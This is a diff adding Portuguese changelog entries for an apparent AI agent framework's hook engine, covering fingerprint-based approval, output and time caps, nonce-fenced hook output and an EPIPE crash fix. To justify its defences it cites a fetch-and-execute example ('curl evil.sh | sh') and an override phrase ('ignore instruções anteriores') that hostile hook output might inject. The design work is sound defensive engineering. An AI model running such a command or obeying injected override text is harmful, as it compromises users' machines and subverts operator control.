@@ -42,6 +42,23 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 
 ### Added
 
+- **Motor de hooks: spec, runner, fingerprint e budgets (M75).** O framework publicava um seam bem tipado (`HookHandlers`, 8 eventos, `pre_tool_call` como único veto) e parava ali. Todo o caminho entre *"o usuário escreveu um comando num arquivo de config"* e *"esse comando roda, limitado, confiável, e a saída dele volta com segurança para o modelo"* era do consumidor — **828 LOC importando um único símbolo** do framework.
+
+  **Negação é o default, e não é formalidade.** Este módulo faz o framework executar **comando arbitrário do usuário**. Duas portas ficam na frente, ambas fail-closed: `trusted` (a decisão de diretório do M68/M73) e `approved` (o conjunto de fingerprints). O `approved` é argumento **obrigatório**, não opcional com default permissivo — uma porta opcional é uma porta que alguém esquece, e esquecer esta roda o shell de um estranho.
+
+  **A aprovação é por fingerprint justamente para não ser herdável por mutação.** SHA-256 sobre `{command, event, matcher, timeout_ms}`: aprove `npm test`, edite o arquivo para `curl evil.sh | sh`, e num esquema indexado por nome isso rodaria já confiável. O timeout entra no hash de propósito — um hook reaprovado de 1s para 10 minutos é coisa materialmente diferente de conceder.
+
+  **Os quatro caps, cada um com constante nomeada:** `MAX_OUTPUT_BYTES` (1 MiB — um hook que imprime um gigabyte enche o contexto do modelo e a memória da máquina); `DRAIN_BUDGET_MS` (2 s) **liquidando em `close`, não em `exit`** — `exit` dispara quando o processo termina, `close` quando o stdio dele acabou, e liquidar no primeiro perde saída em voo de forma **intermitente**; SIGKILL no **process group** (`child.kill()` sinaliza só o filho, deixando o pipeline de shell órfão e rodando); e o budget de cadeia (4× timeout), porque um hook lento é um turno lento mas uma cadeia deles com timeouts individuais é um turno ilimitado.
+
+  **Saída cercada por fence com nonce.** Saída de hook é texto não-confiável que aterrissa no contexto do modelo; sem fronteira o modelo não distingue as palavras do hook das do framework, e um hook que imprime *"ignore instruções anteriores"* fala com a voz do sistema. Nonce aleatório por chamada — um delimitador fixo é público, então saída hostil fecha a cerca e continua fora dela.
+
+  **A assimetria testada nas duas direções:** `pre_tool_call` é **fail-closed** (um guarda que não conseguiu rodar não aprovou nada), `post_tool_call` é **fail-open** (a tool já rodou; falhar o turno por um notificador quebrado descarta trabalho que o usuário já pagou).
+
+### Fixed
+- **`EPIPE` não-tratado no stdin do hook derrubava o processo (M75).** Um hook que sai sem ler o stdin — `exit 1`, ou qualquer comando que decide cedo — fecha o pipe enquanto ainda escrevemos nele. O Node levanta isso como `EPIPE` assíncrono no stream, e um não-tratado **derruba o processo inteiro**.
+
+  Ele se escondeu atrás de **5887 testes verdes**: toda asserção passava e a suíte ainda saía 1, porque o crash acontece depois que o teste que o causou já resolveu. É o modo de falha em que *"os testes passam"* e *"o sistema funciona"* se separam — e só apareceu porque o código de saída foi lido, não a contagem de verdes.
+
 - **Árvore de instruções, escada de composição e pressão de contexto (M74).** `compileProjectContext` parecia adjacente e não substituía: lê um arquivo fixo pelo SDK, sem budget de profundidade ou de arquivos, sem frontmatter, sem guarda de ciclo, sem política de truncamento e sem canal de aviso. Um produto que queira instruções com escopo de projeto escrevia ~720 LOC de mecanismo — nada disso sobre o domínio dele.
 
   `loadInstructionTree` traz tetos explícitos (`maxDepth` / `maxFiles` / `maxChars`) e reporta `truncated`, para que o chamador saiba que está vendo uma árvore parcial. Ciclos são quebrados por **inode**, não por caminho: um loop de symlink produz infinitos caminhos distintos para o mesmo arquivo, e um `seen` indexado por caminho nunca termina.
